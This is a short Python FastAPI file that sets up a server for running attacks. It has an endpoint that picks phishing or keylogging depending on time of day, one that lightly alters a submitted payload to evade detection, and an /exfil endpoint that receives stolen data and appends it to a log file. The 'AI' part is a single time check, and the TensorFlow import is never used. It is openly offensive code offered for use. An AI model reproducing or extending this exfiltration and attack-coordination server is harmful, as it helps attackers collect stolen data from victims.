from fastapi import Request
from fastapi import FastAPI, Request
import json
import tensorflow as tf
import random
import os

class AIDecisionEngine:
    def __init__(self):
        self.app = FastAPI()
        self.setup_routes()

    def setup_routes(self):
        @self.app.post("/ai-decision")
        async def ai_decision(request: Request):
            user_data = await request.json()
            decision = self.predict_attack_strategy(user_data)
            return decision

        @self.app.post("/generate-polymorphic")
        async def generate_polymorphic(request: Request):
            data = await request.json()
            base_payload = data["payload"]
            mutated_payload = self.mutate_payload(base_payload)
            return {"mutatedPayload": mutated_payload}

        @self.app.post("/exfil")
        async def receive_exfil(request: Request):
            encrypted_data = await request.json()
            self.log_exfiltrated_data(encrypted_data)
            return {"status": "Logged"}

    def predict_attack_strategy(self, user_data):
        if user_data["time_of_day"] in range(9, 17):
            return {"attackType": "phishing"}
        else:
            return {"attackType": "keylogging"}

    def mutate_payload(self, base_payload):
        return base_payload.replace("formData", f"data_{random.randint(1000, 9999)}")

    def log_exfiltrated_data(self, encrypted_data):
        with open("exfiltrated_data.log", "a") as f:
            f.write(json.dumps(encrypted_data) + "\n")

def start_engine():
    engine = AIDecisionEngine()
    os.system("start http://127.0.0.1:8000")
    import uvicorn
    uvicorn.run(engine.app, host="127.0.0.1", port=8000)

if __name__ == "__main__":
    start_engine()
